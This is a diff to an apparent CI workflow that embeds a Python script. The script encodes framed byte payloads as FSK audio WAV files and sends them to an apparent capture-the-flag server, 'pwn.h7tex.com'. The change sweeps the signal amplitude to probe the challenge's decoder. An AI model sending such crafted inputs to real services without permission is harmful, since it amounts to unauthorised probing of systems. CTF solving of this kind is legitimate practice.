@@ -66,13 +66,13 @@ jobs:
               b=bytes([0xa5,0x5a,len(payload)])+payload
               b+=bytes([len(payload)^__import__('functools').reduce(int.__xor__,payload,0)])
               return b
-          def wav_for(payload):
+          def wav_for(payload, amp=0.25):
               raw=frame(payload)
               ns=[x for byte in raw for x in (byte>>4,byte&15)]
               samples=[0.0]* (200+200*len(ns))
               for i,n in enumerate(ns):
                   for j in range(200):
-                      samples[200+i*200+j]=0.25*math.sin(2*math.pi*(800+80*n)*j/16000)
+                      samples[200+i*200+j]=amp*math.sin(2*math.pi*(800+80*n)*j/16000)
               pcm=b''.join(struct.pack('<i',int(max(-8388608,min(8388607,v*8388607))))[:3] for v in samples for _ in range(6))
               out=io.BytesIO()
               with wave.open(out,'wb') as w:
@@ -81,7 +81,8 @@ jobs:
           s=socket.create_connection(('pwn.h7tex.com',42356),timeout=15)
           with open('extracted/reference_ping.wav','rb') as f:
               captures=[base64.b64encode(f.read()).decode()]
-          captures += [wav_for(b'\x10'), wav_for(b'\x01\x01\x0e')]
+          captures += [wav_for(b'\x10')]
+          captures += [wav_for(b'\x01\x01\x0e', a) for a in [0.01,0.03,0.06,0.1,0.15,0.2]]
           for capture in captures:
               s.sendall((capture+'\n').encode())
               result=b''
